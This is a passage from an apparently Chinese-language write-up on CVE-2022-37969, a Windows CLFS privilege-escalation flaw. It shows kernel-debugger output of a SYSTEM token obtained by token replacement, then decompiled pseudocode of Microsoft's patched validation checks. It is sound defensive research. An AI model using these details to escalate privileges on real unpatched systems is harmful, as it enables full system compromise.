style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>token ffff8e8603e616f0</span></span><span style="display:flex;"><span>_TOKEN<span style="color:#ae81ff">0xffff8e8603e616f0</span></span></span><span style="display:flex;"><span>TS Session ID:<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>User: S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">18</span></span></span><span style="display:flex;"><span>User Groups:</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">544</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> Default Enabled Owner</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> Mandatory Default Enabled</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> Mandatory Default Enabled</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16384</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> GroupIntegrity GroupIntegrityEnabled</span></span><span style="display:flex;"><span>Primary Group: S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">18</span></span></span><span style="display:flex;"><span>Privs:</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">0x000000002</span> SeCreateTokenPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">0x000000003</span> SeAssignPrimaryTokenPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">0x000000004</span> SeLockMemoryPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">0x000000005</span> SeIncreaseQuotaPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">0x000000007</span> SeTcbPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">0x000000008</span> SeSecurityPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span><span style="color:#ae81ff">0x000000009</span> SeTakeOwnershipPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span><span style="color:#ae81ff">0x00000000a</span> SeLoadDriverPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span><span style="color:#ae81ff">0x00000000b</span> SeSystemProfilePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span><span style="color:#ae81ff">0x00000000c</span> SeSystemtimePrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">0x00000000d</span> SeProfileSingleProcessPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">14</span><span style="color:#ae81ff">0x00000000e</span> SeIncreaseBasePriorityPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span><span style="color:#ae81ff">0x00000000f</span> SeCreatePagefilePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span><span style="color:#ae81ff">0x000000010</span> SeCreatePermanentPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span><span style="color:#ae81ff">0x000000011</span> SeBackupPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span><span style="color:#ae81ff">0x000000012</span> SeRestorePrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">19</span><span style="color:#ae81ff">0x000000013</span> SeShutdownPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">20</span><span style="color:#ae81ff">0x000000014</span> SeDebugPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span><span style="color:#ae81ff">0x000000015</span> SeAuditPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span><span style="color:#ae81ff">0x000000016</span> SeSystemEnvironmentPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">23</span><span style="color:#ae81ff">0x000000017</span> SeChangeNotifyPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span><span style="color:#ae81ff">0x000000019</span> SeUndockPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">28</span><span style="color:#ae81ff">0x00000001c</span> SeManageVolumePrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span><span style="color:#ae81ff">0x00000001d</span> SeImpersonatePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">0x00000001e</span> SeCreateGlobalPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">31</span><span style="color:#ae81ff">0x00000001f</span> SeTrustedCredManAccessPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span><span style="color:#ae81ff">0x000000020</span> SeRelabelPrivilege Attributes<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span><span style="color:#ae81ff">0x000000021</span> SeIncreaseWorkingSetPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span><span style="color:#ae81ff">0x000000022</span> SeTimeZonePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">35</span><span style="color:#ae81ff">0x000000023</span> SeCreateSymbolicLinkPrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36</span><span style="color:#ae81ff">0x000000024</span> SeDelegateSessionUserImpersonatePrivilege Attributes<span style="color:#f92672">-</span> Enabled Default</span></span><span style="display:flex;"><span>Authentication ID: (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3e7</span>)</span></span><span style="display:flex;"><span>Impersonation Level: Anonymous</span></span><span style="display:flex;"><span>TokenType: Primary</span></span><span style="display:flex;"><span>Source:<span style="color:#f92672">*</span>SYSTEM<span style="color:#f92672">*</span> TokenFlags:<span style="color:#ae81ff">0x2000</span> ( Token in use )</span></span><span style="display:flex;"><span>Token ID:<span style="color:#ae81ff">3</span>eb ParentToken ID:<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>Modified ID: (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3</span>ec)</span></span><span style="display:flex;"><span>RestrictedSidCount:<span style="color:#ae81ff">0</span> RestrictedSids:<span style="color:#ae81ff">0x0000000000000000</span></span></span><span style="display:flex;"><span>OriginatingLogonSession:<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>PackageSid: (null)</span></span><span style="display:flex;"><span>CapabilityCount:<span style="color:#ae81ff">0</span> Capabilities:<span style="color:#ae81ff">0x0000000000000000</span></span></span><span style="display:flex;"><span>LowboxNumberEntry:<span style="color:#ae81ff">0x0000000000000000</span></span></span><span style="display:flex;"><span>Security Attributes:</span></span><span style="display:flex;"><span>Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span></span><span style="display:flex;"><span>Process Token TrustLevelSid: S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8192</span></span></span></code></pre></div><p>替换完Token之后当前进程权限已经变为system权限</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/19.png"/></p><h3 id="补丁分析">补丁分析</h3><p><strong>WIN10</strong></p><p>使用Bindiff查看可知补丁主要修改了三个函数</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/20.png"/></p><p>在<code>CClfsBaseFilePersisted::LoadContainerQ</code>增加了对<code>SignatureOffset</code>的检查，使其不能超过<code>BASE_RECORD</code>大小，增加了对<code>cbSymbolZone</code> 的检查</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">LoadContainerQ</span>(</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> a4,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> a5,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">union</span> _CLS_LSN a6,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a7,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a8,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span><span style="color:#f92672">*</span>a9)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v16 );</span></span><span style="display:flex;"><span> v74<span style="color:#f92672">=</span><span style="color:#a6e22e">ExAcquireResourceExclusiveLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( BaseLogRecord )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">Feature_Servicing_41154973__private_IsEnabled</span>() )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">0x68</span>)<span style="color:#f92672">></span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span> )<span style="color:#75715e">// SignatureOffset</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> {</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v73<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_146;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongLongAdd</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1338</span>,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4CA</span>),<span style="color:#f92672">&amp;</span>v91)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongLongAdd</span>(v10, v21,<span style="color:#f92672">&amp;</span>v90)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span><span style="color:#75715e">// 将BASE_RECORD_HEADER和cbSymbolZone相加</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">||</span> v91<span style="color:#f92672">></span> v90 )<span style="color:#f92672">**</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v73<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_146;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> Src<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)BaseLogRecord<span style="color:#f92672">+</span><span style="color:#ae81ff">808</span>;</span></span><span style="display:flex;"><span> v79<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ContainerCount</span>(this);</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x400</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span> (CClfsContainer<span style="color:#f92672">*</span>)v11;</span></span></code></pre></div><p>在<code>CClfsBaseFile::GetSymbol</code>中增加了对<code>Client Context</code> 的检查，验证是否是正确的<code>Client Context</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(</span></span><span style="display:flex;"><span> PERESOURCE<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_CLIENT_CONTEXT<span style="color:#f92672">**</span>a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>...</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v11 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_12;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(v11<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">!=</span> a2 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span>;</span></span><span style="display:flex;"><span>LABEL_13:</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_14;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#a6e22e">ClfsQuadAlign</span>(<span style="color:#ae81ff">0x88u</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#a6e22e">if</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v13<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">!=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v15<span style="color:#f92672">+</span> v12)<span style="color:#75715e">// 验证Client Context上下文</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v13<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1040322553</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v13<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span> v14</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)v13<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">!=</span> a3<span style="color:#f92672">**</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_12:</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_13;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a4<span style="color:#f92672">=</span> v13;</span></span></code></pre></div><p><strong>WIN11</strong></p><p>win11上补丁主要新增了以下几个函数</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AllocOffsetNode</span>(_RTL_AVL_TABLE<span style="color:#f92672">*</span>,ulong)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">CompareGenericoffsets</span>(_RTL_AVL_TABLE<span style="color:#f92672">*</span>,<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateCheckifWithinSymbolZone</span>(ulong,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientContextOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientSymTblOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateContainerSymTblOffsets</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)</span></span><span style="display:flex;"><span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateProcessQNode</span>(_CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>,_CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>,ulong,ulong<span style="color:#f92672">&amp;</span>,ulong<span style="color:#f92672">&amp;</span>)</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/21.png"/></p><p>从<code>CClfsBaseFilePersisted::LoadContainerQ</code> 函数开始调用堆栈为：</p><p><code>CClfsBaseFilePersisted::LoadContainerQ→CClfsBaseFile::ValidateOffsets→CClfsBaseFile::ValidateClientContextOffsets→CClfsBaseFile::ValidateCheckifWithinSymbolZone</code></p><p>函数<code>CClfsBaseFile::ValidateOffsets</code> 伪代码如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateOffsets</span>(CClfsBaseFile<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> v4;<span style="color:#75715e">// r13</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>TableContext;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>v7;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>......</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>i64);</span></span><span style="display:flex;"><span> TableContext<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(PagedPool,<span style="color:#ae81ff">0x68u</span>i64,<span style="color:#ae81ff">0x73666C43u</span>);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_VALIDATE_OFFSET_TABLE<span style="color:#f92672">*</span>)TableContext;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>TableContext )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225626</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlInitializeGenericTableAvl</span>(</span></span><span style="display:flex;"><span> TableContext,</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span>CompareGenericoffsets,</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span>AllocOffsetNode,</span></span><span style="display:flex;"><span> CClfsLogFcbPhysical<span style="color:#f92672">::</span>ReleaseLsnMap,</span></span><span style="display:flex;"><span> TableContext);</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">></span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_25;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">1226</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">4920</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v10<span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">4920</span><span style="color:#f92672">||</span> v5<span style="color:#f92672">+</span> v9<span style="color:#f92672">&lt;</span> v5<span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)v10<span style="color:#f92672">></span> v5<span style="color:#f92672">+</span> v9 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_25;</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateContainerContextOffsets</span>(this, v7, a2);</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#a6e22e">if</span> ( v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientContextOffsets</span>(this, (<span style="color:#66d9ef">struct</span> _RTL_AVL_TABLE<span style="color:#f92672">*</span>)v7, a2), v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateContainerSymTblOffsets</span>(this, v7, a2), v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v11<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ValidateClientSymTblOffsets</span>(this, v7, a2), v11<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>) )<span style="color:#f92672">**</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_26:</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span>LABEL_35:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExFreePoolWithTag</span>(v7,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v11;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>该代码中通过调用<code>CClfsBaseFile::ValidateClientContextOffsets CClfsBaseFile::ValidateClientSymTblOffsets CClfsBaseFile::ValidateContainerSymTblOffsets</code>检查Client Context Offset、Container Sybbol Table等偏移是否合法。</p><p><code>CClfsBaseFile::ValidateClientContextOffsets</code>伪代码如下，该代码循环遍历检查每个<code>Container</code>并调用<code>CClfsBaseFile::ValidateCheckifWithinSymbolZone</code>检查<code>cbSymbolZone</code>是否合法。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code 